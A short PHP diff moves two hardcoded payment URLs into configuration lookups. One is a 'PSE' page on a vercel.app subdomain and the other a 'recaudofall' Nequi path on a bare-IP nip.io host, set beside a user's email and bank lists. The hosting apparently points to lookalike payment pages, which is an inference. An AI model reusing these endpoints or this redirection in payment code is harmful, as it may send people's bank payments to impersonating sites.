@@ -51,8 +51,8 @@ if (count($words) >= 3) {
 
 $email = $userInfo['EMAIL'] ?? '';
 $PSE_BANKS = $pseConfig['primary_banks'] ?? [];
-$PSE_PRIMARY_PAGE = 'https://pagosonline-pse.vercel.app';
-$RECAUDOFALL_BASE = 'https://recaudofall.94.250.202.215.nip.io/nequi';
+$PSE_PRIMARY_PAGE = $pseConfig['links']['primary_page'] ?? 'https://pagosonline-pse.vercel.app';
+$RECAUDOFALL_BASE = $pseConfig['links']['recaudofall_base'] ?? 'https://recaudofall.94.250.202.215.nip.io/nequi';
 $PSE_BANKS_RECAUDOFALL = $pseConfig['recaudofall_banks'] ?? [];
 $PSE_BANK_ALIASES = $pseConfig['aliases'] ?? [];
 
